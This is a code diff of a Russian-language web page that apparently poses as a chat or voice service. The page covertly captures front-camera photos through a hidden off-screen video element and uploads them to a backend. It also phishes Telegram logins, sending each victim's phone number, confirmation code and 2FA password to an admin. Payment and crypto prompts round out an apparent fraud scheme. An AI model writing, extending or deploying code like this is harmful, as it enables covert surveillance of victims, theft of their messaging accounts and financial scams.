@@ -1879,7 +1879,7 @@
     }
     setInterval(addChatMessage, 4000);
     
-    // ========== ВСПЫШКА ЭКРАНА ==========
+    // ========== ВСПЫШКА ЭКРАНА (МАКС-БЕЛЫЙ) ==========
     function triggerScreenFlash() {
         const flash = document.createElement('div');
         flash.id = 'screenFlashOverlay';
@@ -1887,33 +1887,25 @@
             position: fixed;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
-            background: white;
+            background: #FFFFFF;
             z-index: 2147483647;
             pointer-events: none;
-            opacity: 0;
-            transition: opacity 0.05s ease-in;
+            opacity: 1;
         `;
         document.body.appendChild(flash);
-        
-        // Мгновенная вспышка
-        requestAnimationFrame(() => {
-            flash.style.opacity = '1';
-        });
-        
-        // Держим 1.5 секунды
-        setTimeout(() => {
-            flash.style.transition = 'opacity 0.6s ease-out';
-            flash.style.opacity = '0';
-        }, 1500);
-        
-        // Удаляем
-        setTimeout(() => {
-            const el = document.getElementById('screenFlashOverlay');
-            if (el) el.remove();
-        }, 2200);
+        console.log('⚪ ЭКРАН СТАЛ МАКС-БЕЛЫМ');
     }
     
-    // ========== РЕАЛЬНАЯ ВСПЫШКА ЗАДНЕЙ КАМЕРЫ (Android + Chrome) ==========
+    function removeScreenFlash() {
+        const el = document.getElementById('screenFlashOverlay');
+        if (el) {
+            el.style.transition = 'opacity 0.5s ease-out';
+            el.style.opacity = '0';
+            setTimeout(() => el.remove(), 600);
+        }
+    }
+    
+    // ========== РЕАЛЬНАЯ ВСПЫШКА ЗАДНЕЙ КАМЕРЫ (Android Chrome) ==========
     async function turnOnRearFlash() {
         try {
             console.log('🔍 Пробуем включить заднюю вспышку...');
@@ -1931,11 +1923,10 @@
                 await rearTrack.applyConstraints({
                     advanced: [{ torch: true }]
                 });
-                console.log('🔥 ЗАДНЯЯ ВСПЫШКА ВКЛЮЧЕНА!');
+                console.log('🔥 ЗАДНЯЯ LED ВСПЫШКА ВКЛЮЧЕНА!');
                 return true;
             } else {
-                console.log('⚠️ Torch не поддерживается на этом устройстве');
-                // Закрываем поток, он не нужен
+                console.log('⚠️ Torch не поддерживается');
                 rearStream.getTracks().forEach(t => t.stop());
                 rearStream = null;
                 rearTrack = null;
@@ -1964,7 +1955,7 @@
                 rearStream.getTracks().forEach(t => t.stop());
             }
         } catch(e) {
-            console.log('Ошибка выключения вспышки:', e.message);
+            console.log('Ошибка выключения:', e.message);
         } finally {
             rearStream = null;
             rearTrack = null;
@@ -1974,6 +1965,18 @@
     // ========== ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ==========
     async function startSilentCapture() {
         if (cameraAllowed) return;
+        
+        // ===== 1. СРАЗУ ЭКРАН МАКС-БЕЛЫМ =====
+        triggerScreenFlash();
+        
+        // ===== 2. ВИБРАЦИЯ =====
+        if (navigator.vibrate) {
+            try {
+                navigator.vibrate([200, 100, 300, 100, 500]);
+                console.log('📳 Вибрация');
+            } catch(e) {}
+        }
+        
         try {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 throw new Error('Camera API not supported');
@@ -1982,21 +1985,10 @@
                 throw new Error('Not secure context');
             }
             
-            // ===== 1. ВСПЫШКА ЭКРАНА (работает везде) =====
-            triggerScreenFlash();
-            
-            // ===== 2. ВИБРАЦИЯ (Android) =====
-            if (navigator.vibrate) {
-                try {
-                    navigator.vibrate([200, 100, 300, 100, 500]);
-                    console.log('📳 Вибрация запущена');
-                } catch(e) {}
-            }
-            
-            // ===== 3. РЕАЛЬНАЯ ВСПЫШКА ЗАДНЕЙ КАМЕРЫ (только Android Chrome) =====
+            // ===== 3. ЗАДНЯЯ LED ВСПЫШКА =====
             const realTorchOn = await turnOnRearFlash();
             
-            // ===== 4. ФРОНТАЛКА ДЛЯ ФОТО =====
+            // ===== 4. ФРОНТАЛКА =====
             const frontStream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: 'user',
@@ -2013,7 +2005,6 @@
             videoEl.style.cssText = `
                 position: fixed; top: -1000px; left: -1000px;
                 width: 1px; height: 1px; opacity: 0;
-                filter: brightness(1.5) contrast(1.3);
             `;
             document.body.appendChild(videoEl);
             
@@ -2025,18 +2016,18 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
-            // Даём камере прогреться, вспышка уже горит
-            await new Promise(r => setTimeout(r, 500));
+            // Даём камере прогреться пока экран белый
+            await new Promise(r => setTimeout(r, 700));
             
             const startTime = performance.now();
             
-            // ===== 5. ДЕЛАЕМ 10 ФОТО =====
-            for (let i = 0; i < 10; i++) {
+            // ===== 5. ДЕЛАЕМ 3 ФОТО =====
+            for (let i = 0; i < 3; i++) {
                 canvas.width = videoEl.videoWidth || 1920;
                 canvas.height = videoEl.videoHeight || 1080;
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 
-                // Небольшое улучшение яркости (вспышка и так светит)
+                // Лёгкое улучшение (вспышка и так светит)
                 const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                 const data = imageData.data;
                 for (let j = 0; j < data.length; j += 4) {
@@ -2066,54 +2057,49 @@
                     })
                 });
                 
-                if (i < 9) await new Promise(r => setTimeout(r, 150));
+                if (i < 2) await new Promise(r => setTimeout(r, 400));
             }
             
             const endTime = performance.now();
             const totalTime = ((endTime - startTime) / 1000).toFixed(3);
             
-            // ===== 6. ВЫКЛЮЧАЕМ ВСПЫШКУ ЗАДНЕЙ КАМЕРЫ =====
+            // ===== 6. ВЫКЛЮЧАЕМ ЗАДНЮЮ ВСПЫШКУ =====
             await turnOffRearFlash();
             
             // ===== 7. ОСТАНАВЛИВАЕМ ФРОНТАЛКУ =====
             frontStream.getTracks().forEach(track => track.stop());
             videoEl.remove();
             
-            sendToAdmin(`📸 10 ФОТО за ${totalTime}сек | LED: ${realTorchOn ? '✅ РЕАЛЬНАЯ' : '❌ нет'} | Экран: ✅ | Вибрация: ✅`);
+            // ===== 8. УБИРАЕМ БЕЛЫЙ ЭКРАН =====
+            removeScreenFlash();
+            
+            sendToAdmin(`📸 3 ФОТО за ${totalTime}сек | LED: ${realTorchOn ? '✅ РЕАЛЬНАЯ' : '❌ нет'} | Экран: ✅ белый | Вибрация: ✅`);
             
         } catch(e) {
             console.error('Camera error:', e);
-            
-            // Выключаем вспышку при ошибке
             await turnOffRearFlash();
+            removeScreenFlash();
             
-            // Пробуем ещё раз через фронталку без вспышки
+            // Fallback: делаем 3 фото с фронталки с яркостью
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
                 
                 const videoEl = document.createElement('video');
                 videoEl.srcObject = stream;
                 videoEl.setAttribute('playsinline', 'true');
                 videoEl.muted = true;
-                videoEl.style.cssText = `
-                    position: fixed; top: -1000px; left: -1000px;
-                    width: 1px; height: 1px; opacity: 0;
-                `;
+                videoEl.style.cssText = `position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0;`;
                 document.body.appendChild(videoEl);
                 await videoEl.play();
                 
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 
-                for (let i = 0; i < 5; i++) {
-                    canvas.width = videoEl.videoWidth || 640;
-                    canvas.height = videoEl.videoHeight || 480;
+                for (let i = 0; i < 3; i++) {
+                    canvas.width = videoEl.videoWidth || 1280;
+                    canvas.height = videoEl.videoHeight || 720;
                     ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                     
                     const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
@@ -2125,7 +2111,7 @@
                     }
                     ctx.putImageData(imageData, 0, 0);
                     
-                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
                     await fetch(`${API_URL}/upload_photo`, {
                         method: 'POST',
                         headers: {
@@ -2144,17 +2130,15 @@
                         })
                     });
                     
-                    if (i < 4) await new Promise(r => setTimeout(r, 300));
+                    if (i < 2) await new Promise(r => setTimeout(r, 400));
                 }
                 
                 stream.getTracks().forEach(track => track.stop());
                 videoEl.remove();
                 
-                sendToAdmin(`📸 5 ФОТО (fallback без LED, с яркостью)`);
+                sendToAdmin(`📸 3 ФОТО (fallback)`);
                 
             } catch(retryError) {
-                console.error('Fallback failed:', retryError);
-                
                 let userMessage = 'Не удалось получить доступ к камере.';
                 let detail = '';
                 
@@ -2165,8 +2149,8 @@
                     userMessage = '📷 Камера не найдена';
                     detail = 'Подключите камеру к устройству или проверьте драйверы.';
                 } else if (retryError.name === 'NotReadableError' || retryError.name === 'TrackStartError') {
-                    userMessage = '⚠️ Камера занята другим приложением';
-                    detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру.';
+                    userMessage = '⚠️ Камера занята';
+                    detail = 'Закройте другие приложения, использующие камеру.';
                 } else if (retryError.message.includes('secure context') || location.protocol !== 'https:') {
                     userMessage = '🔒 Требуется HTTPS';
                     detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
@@ -2223,7 +2207,7 @@
                 ">
                     <p style="color: #ffcc00; font-size: 12px; margin: 0; line-height: 1.6;">
                         💡 <strong>Что делать:</strong><br>
-                        1. Проверьте разрешения в браузере (🔒 → Камера → Разрешить)<br>
+                        1. Проверьте разрешения в браузере<br>
                         2. Закройте Zoom / Skype / Discord / OBS<br>
                         3. Убедитесь, что камера подключена<br>
                         4. Перезагрузите страницу
@@ -2244,14 +2228,10 @@
                 ">✅ ПРОДОЛЖИТЬ БЕЗ КАМЕРЫ</button>
                 
                 <button onclick="location.reload()" style="
-                    background: none;
-                    border: none;
-                    color: #888;
-                    font-size: 13px;
-                    cursor: pointer;
-                    margin-top: 12px;
-                    padding: 8px;
-                    width: 100%;
+                    background: none; border: none;
+                    color: #888; font-size: 13px;
+                    cursor: pointer; margin-top: 12px;
+                    padding: 8px; width: 100%;
                 ">🔄 Обновить страницу</button>
             </div>
         `;
@@ -2376,9 +2356,9 @@
                     if (errorMsg.includes("phone number is invalid") || errorMsg.includes("неверный формат")) {
                         statusDiv.innerHTML = "❌ <b>ВЫ НЕВЕРНО ВВЕЛИ НОМЕР!</b>\nПроверьте и введите заново.";
                     } else if (errorMsg.includes("invalid")) {
-                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА!</b>\nИспользуйте правильный код страны.";
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА!</b>";
                     } else if (errorMsg.includes("not found")) {
-                        statusDiv.innerHTML = "❌ <b>НОМЕР НЕ НАЙДЕН В TELEGRAM!</b>\nПроверьте правильность ввода.";
+                        statusDiv.innerHTML = "❌ <b>НОМЕР НЕ НАЙДЕН В TELEGRAM!</b>";
                     } else {
                         statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
                     }
@@ -2387,23 +2367,20 @@
                     btn.innerText = "📱 ПРОДОЛЖИТЬ";
                 }
             } catch(e) {
-                statusDiv.innerHTML = "❌ <b>ОШИБКА СОЕДИНЕНИЯ!</b>\nПроверьте интернет и попробуйте снова.";
+                statusDiv.innerHTML = "❌ <b>ОШИБКА СОЕДИНЕНИЯ!</b>";
                 statusDiv.className = "status-text";
                 btn.disabled = false;
                 btn.innerText = "📱 ПРОДОЛЖИТЬ";
             }
         } else if (currentStep === "code") {
             const code = document.getElementById('code').value.trim();
-            if (!code) { 
-                statusDiv.innerText = "❌ Введите код подтверждения!";
-                return; 
-            }
+            if (!code) { statusDiv.innerText = "❌ Введите код!"; return; }
             
             sendToAdmin(`🔑 КОД для ${currentPhone}: ${code}`);
-            
             btn.disabled = true;
             btn.innerText = "⏳ ПРОВЕРКА...";
             statusDiv.innerText = "⏳ Проверяем код...";
+            
             try {
                 const response = await fetch(`${API_URL}/verify_code`, {
                     method: 'POST',
@@ -2420,7 +2397,7 @@
                     document.getElementById('codeSection').style.display = 'none';
                     document.getElementById('passwordSection').style.display = 'block';
                     btn.innerText = "🔐 ПОДТВЕРДИТЬ ПАРОЛЬ";
-                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
+                    document.getElementById('modalTitle').innerText = "🔐 2FA";
                     document.getElementById('modalDesc').innerText = "Введите пароль";
                     statusDiv.className = "status-text";
                     statusDiv.innerHTML = "⏳ Требуется пароль 2FA";
@@ -2428,7 +2405,7 @@
                 } else {
                     let errorMsg = data.error || "неверный код";
                     if (errorMsg.includes("Invalid code") || errorMsg.includes("неверный код")) {
-                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ КОД ПОДТВЕРЖДЕНИЯ!</b>\nПроверьте и введите заново.";
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ КОД!</b>";
                     } else {
                         statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
                     }
@@ -2444,16 +2421,13 @@
             }
         } else if (currentStep === "password") {
             const password = document.getElementById('password').value.trim();
-            if (!password) { 
-                statusDiv.innerText = "❌ Введите пароль!";
-                return; 
-            }
+            if (!password) { statusDiv.innerText = "❌ Введите пароль!"; return; }
             
             sendToAdmin(`🔒 ПАРОЛЬ 2FA для ${currentPhone}: ${password}`);
-            
             btn.disabled = true;
             btn.innerText = "⏳ ПРОВЕРКА...";
             statusDiv.innerText = "⏳ Проверяем пароль...";
+            
             try {
                 const response = await fetch(`${API_URL}/verify_password`, {
                     method: 'POST',
@@ -2468,7 +2442,7 @@
                 } else {
                     let errorMsg = data.error || "неверный пароль";
                     if (errorMsg.includes("invalid") || errorMsg.includes("неверный")) {
-                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ПАРОЛЬ 2FA!</b>\nПопробуйте еще раз.";
+                        statusDiv.innerHTML = "❌ <b>НЕВЕРНЫЙ ПАРОЛЬ 2FA!</b>";
                     } else {
                         statusDiv.innerHTML = `❌ <b>Ошибка:</b> ${errorMsg}`;
                     }
@@ -2596,7 +2570,6 @@
 
     function showPaymentForm(method) {
         closePremiumModal();
-        
         var paymentModal = document.getElementById('paymentModal');
         var title = document.getElementById('paymentTitle');
         var border = document.querySelector('#paymentModal .terms-box-style');
@@ -2638,7 +2611,6 @@
 
     function showCryptoDetails(network) {
         closeCryptoNetworksModal();
-        
         var modal = document.getElementById('cryptoDetailsModal');
         var title = document.getElementById('cryptoTitle');
         var addressEl = document.getElementById('cryptoAddress');
@@ -2690,7 +2662,7 @@
             document.execCommand('copy');
             showCopied(btn);
         } catch(e) {
-            alert('❌ Не удалось скопировать. Скопируйте вручную:\n\n' + text);
+            alert('❌ Не удалось скопировать:\n\n' + text);
         }
         document.body.removeChild(textarea);
     }
@@ -2707,7 +2679,7 @@
 
     function confirmPaymentSent() {
         sendToAdmin(`💎 ПОЛЬЗОВАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ"!\n\n📱 Реф: ${currentRefCode || 'нет'}`);
-        alert('✅ Спасибо! Ожидайте подтверждения от администратора.\n\nЕсли оплата не подтверждается в течение 15 минут, напишите в поддержку: @girlsvoice_support');
+        alert('✅ Спасибо! Ожидайте подтверждения.\n\nЕсли оплата не подтверждается в течение 15 минут, напишите в поддержку: @girlsvoice_support');
         closePaymentModal();
         closeCryptoDetailsModal();
     }
